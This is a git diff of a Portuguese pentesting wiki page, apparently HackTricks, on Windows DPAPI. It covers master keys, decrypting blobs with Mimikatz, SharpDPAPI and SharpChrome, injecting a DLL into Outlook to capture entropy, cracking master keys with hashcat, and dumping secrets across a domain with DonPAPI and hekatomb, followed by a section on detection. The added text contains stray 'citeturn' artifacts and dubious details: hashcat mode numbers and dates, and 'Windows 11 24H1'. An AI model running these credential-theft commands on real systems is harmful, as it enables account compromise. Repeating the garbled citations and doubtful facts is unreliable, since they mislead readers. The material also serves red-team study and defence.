@@ -6,7 +6,7 @@
 
 ## O que é DPAPI
 
-A API de Proteção de Dados (DPAPI) é utilizada principalmente dentro do sistema operacional Windows para a **criptografia simétrica de chaves privadas assimétricas**, aproveitando segredos de usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a criptografia para os desenvolvedores, permitindo que eles criptografem dados usando uma chave derivada dos segredos de logon do usuário ou, para criptografia do sistema, os segredos de autenticação do domínio do sistema, eliminando assim a necessidade de os desenvolvedores gerenciarem a proteção da chave de criptografia por conta própria.
+A Data Protection API (DPAPI) é utilizada principalmente dentro do sistema operacional Windows para a **criptografia simétrica de chaves privadas assimétricas**, aproveitando segredos de usuário ou do sistema como uma fonte significativa de entropia. Essa abordagem simplifica a criptografia para os desenvolvedores, permitindo que eles criptografem dados usando uma chave derivada dos segredos de logon do usuário ou, para criptografia do sistema, os segredos de autenticação do domínio do sistema, eliminando assim a necessidade de os desenvolvedores gerenciarem a proteção da chave de criptografia por conta própria.
 
 A maneira mais comum de usar o DPAPI é através das funções **`CryptProtectData` e `CryptUnprotectData`**, que permitem que aplicativos criptografem e descriptografem dados de forma segura com a sessão do processo que está atualmente logado. Isso significa que os dados criptografados só podem ser descriptografados pelo mesmo usuário ou sistema que os criptografou.
 
@@ -29,7 +29,7 @@ Observe que a **chave de domínio usada para criptografar a chave mestra está n
 
 Os blobs criptografados contêm o **GUID da chave mestra** que foi usada para criptografar os dados dentro de seus cabeçalhos.
 
-> [!NOTE]
+> [!TIP]
 > Blobs criptografados pelo DPAPI começam com **`01 00 00 00`**
 
 Encontrar chaves mestras:
@@ -47,7 +47,7 @@ Isto é como um conjunto de Chaves Mestras de um usuário se parecerá:
 
 ### Geração de chave de Máquina/Sistema
 
-Esta é a chave usada para a máquina criptografar dados. É baseada no **segredo DPAPI_SYSTEM LSA**, que é uma chave especial que apenas o usuário SYSTEM pode acessar. Esta chave é usada para criptografar dados que precisam ser acessíveis pelo próprio sistema, como credenciais em nível de máquina ou segredos em todo o sistema.
+Esta é a chave usada para a máquina criptografar dados. É baseada no **DPAPI_SYSTEM LSA secret**, que é uma chave especial que apenas o usuário SYSTEM pode acessar. Esta chave é usada para criptografar dados que precisam ser acessíveis pelo próprio sistema, como credenciais em nível de máquina ou segredos em todo o sistema.
 
 Note que essas chaves **não têm um backup de domínio**, portanto, são acessíveis apenas localmente:
 
@@ -172,9 +172,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **Acessar masterkeys**:
+- **Acessar chaves mestras**:
 
-Descriptografar uma masterkey de um usuário solicitando a **chave de backup do domínio** usando RPC:
+Descriptografar uma chave mestra de um usuário solicitando a **chave de backup do domínio** usando RPC:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -229,9 +229,34 @@ dpapi::blob /in:C:\path\to\encrypted\file /unprotect
 # SharpDPAPI
 SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
+---
+### Manipulando Entropia Opcional ("Entropia de terceiros")
+
+Alguns aplicativos passam um valor adicional de **entropia** para `CryptProtectData`. Sem esse valor, o blob não pode ser descriptografado, mesmo que a chave mestra correta seja conhecida. Obter a entropia é, portanto, essencial ao direcionar credenciais protegidas dessa forma (por exemplo, Microsoft Outlook, alguns clientes VPN).
+
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) é uma DLL em modo de usuário que intercepta as funções DPAPI dentro do processo alvo e registra de forma transparente qualquer entropia opcional que seja fornecida. Executar o EntropyCapture em modo **DLL-injection** contra processos como `outlook.exe` ou `vpnclient.exe` gerará um arquivo mapeando cada buffer de entropia para o processo chamador e o blob. A entropia capturada pode ser fornecida posteriormente ao **SharpDPAPI** (`/entropy:`) ou **Mimikatz** (`/entropy:<file>`) para descriptografar os dados. citeturn5search0
+```powershell
+# Inject EntropyCapture into the current user's Outlook
+InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
+
+# Later decrypt a credential blob that required entropy
+SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
+```
+### Quebrando masterkeys offline (Hashcat & DPAPISnoop)
+
+A Microsoft introduziu um formato de masterkey **contexto 3** a partir do Windows 10 v1607 (2016). `hashcat` v6.2.6 (Dezembro de 2023) adicionou modos de hash **22100** (DPAPI masterkey v1 contexto), **22101** (contexto 1) e **22102** (contexto 3), permitindo a quebra acelerada por GPU de senhas de usuários diretamente do arquivo masterkey. Os atacantes podem, portanto, realizar ataques de lista de palavras ou força bruta sem interagir com o sistema alvo. citeturn8search1
+
+`DPAPISnoop` (2024) automatiza o processo:
+```bash
+# Parse a whole Protect folder, generate hashcat format and crack
+DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
+hashcat -m 22102 bob.hc wordlist.txt -O -w4
+```
+A ferramenta também pode analisar blobs de Credenciais e Cofres, descriptografá-los com chaves quebradas e exportar senhas em texto claro.
+
 ### Acessar dados de outra máquina
 
-No **SharpDPAPI e SharpChrome**, você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Claro que você precisa ser capaz de acessar essa máquina e no exemplo a seguir supõe-se que a **chave de criptografia de backup do domínio é conhecida**:
+No **SharpDPAPI e SharpChrome** você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Claro que você precisa ser capaz de acessar essa máquina e no exemplo a seguir supõe-se que a **chave de criptografia de backup do domínio é conhecida**:
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -244,23 +269,46 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-Com a lista de computadores extraída do LDAP, você pode encontrar toda sub-rede mesmo que não soubesse delas!
+Com a lista de computadores extraída do LDAP, você pode encontrar cada sub-rede, mesmo que não as conhecesse!
 
-### DonPAPI
+### DonPAPI 2.x (2024-05)
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode despejar segredos protegidos por DPAPI automaticamente.
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode despejar segredos protegidos por DPAPI automaticamente. A versão 2.x introduziu:
 
-### Detecções comuns
+* Coleta paralela de blobs de centenas de hosts
+* Análise de chaves mestres **contexto 3** e integração automática de cracking com Hashcat
+* Suporte para cookies criptografados "App-Bound" do Chrome (veja a próxima seção)
+* Um novo modo **`--snapshot`** para consultar repetidamente os endpoints e diferenciar blobs recém-criados citeturn1search2
+
+### DPAPISnoop
+
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) é um parser C# para arquivos de chave mestre/credencial/cofre que pode gerar formatos Hashcat/JtR e, opcionalmente, invocar cracking automaticamente. Ele suporta totalmente os formatos de chave mestre de máquina e usuário até o Windows 11 24H1. citeturn2search0
+
+
+## Detecções comuns
 
 - Acesso a arquivos em `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e outros diretórios relacionados ao DPAPI.
-- Especialmente de um compartilhamento de rede como C$ ou ADMIN$.
-- Uso do Mimikatz para acessar a memória do LSASS.
-- Evento **4662**: Uma operação foi realizada em um objeto.
-- Este evento pode ser verificado para ver se o objeto `BCKUPKEY` foi acessado.
+- Especialmente a partir de um compartilhamento de rede como **C$** ou **ADMIN$**.
+- Uso de **Mimikatz**, **SharpDPAPI** ou ferramentas similares para acessar a memória do LSASS ou despejar chaves mestres.
+- Evento **4662**: *Uma operação foi realizada em um objeto* – pode ser correlacionado com o acesso ao objeto **`BCKUPKEY`**.
+- Evento **4673/4674** quando um processo solicita *SeTrustedCredManAccessPrivilege* (Gerenciador de Credenciais)
+
+---
+### Vulnerabilidades de 2023-2025 e mudanças no ecossistema
+
+* **CVE-2023-36004 – Spoofing de Canal Seguro do Windows DPAPI** (Novembro de 2023). Um atacante com acesso à rede poderia enganar um membro do domínio para recuperar uma chave de backup DPAPI maliciosa, permitindo a descriptografia de chaves mestres de usuário. Corrigido na atualização cumulativa de novembro de 2023 – os administradores devem garantir que os DCs e estações de trabalho estejam totalmente corrigidos. citeturn4search0
+* **Criptografia de cookie "App-Bound" do Chrome 127** (Julho de 2024) substituiu a proteção DPAPI apenas legada por uma chave adicional armazenada sob o **Gerenciador de Credenciais** do usuário. A descriptografia offline de cookies agora requer tanto a chave mestre DPAPI quanto a **chave app-bound envolta em GCM**. SharpChrome v2.3 e DonPAPI 2.x são capazes de recuperar a chave extra ao serem executados com o contexto do usuário. citeturn0search0
+
 
 ## Referências
 
-- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
-- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
+- https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c
+- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004
+- https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
+- https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/
+- https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6
+- https://github.com/Leftp/DPAPISnoop
+- https://pypi.org/project/donpapi/2.0.0/
 
 {{#include ../../banners/hacktricks-training.md}}
